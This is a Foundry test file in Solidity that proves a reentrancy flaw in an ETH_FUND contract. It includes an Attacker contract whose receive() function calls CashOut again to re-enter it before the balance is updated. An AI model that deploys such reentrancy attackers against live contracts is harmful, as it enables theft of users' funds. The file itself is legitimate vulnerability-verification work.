
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND, Log} from "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_FUND(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constraint: attackVal must be > 1 ether (MinDeposit) and small enough to avoid overflow issues
        vm.assume(attackVal > 1.1 ether && attackVal < 1000 ether);

        // We need to deposit enough to cover two withdrawals.
        // Since Solidity 0.8.x protects against underflow, we cannot drain more than the balance.
        // However, we can prove Reentrancy exists by successfully re-entering and executing logic
        // before the state update occurs.
        uint256 depositAmount = attackVal * 2;

        // Fund the test contract so it can send ETH to the attacker
        vm.deal(address(this), depositAmount);

        // Setup: Attacker deposits funds into the victim contract
        _attacker.setupAttack{value: depositAmount}(attackVal);

        // The CashOut function requires block.number > lastBlock.
        // Deposit updated lastBlock, so we must advance time/blocks.
        vm.roll(block.number + 10);

        // Trigger Attack
        _attacker.attack(attackVal);

        // Verify Success
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ETH_FUND(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        storedAttackVal = val;
        // Deposit funds to pass the balance check in CashOut
        _victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        attackCallCount = 1;
        exploitSucceeded = false;

        // Call the vulnerable function
        _victim.CashOut(val);

        // If we successfully re-entered, the count should be 2
        if (attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            _victim.CashOut(storedAttackVal);
        }
    }
}
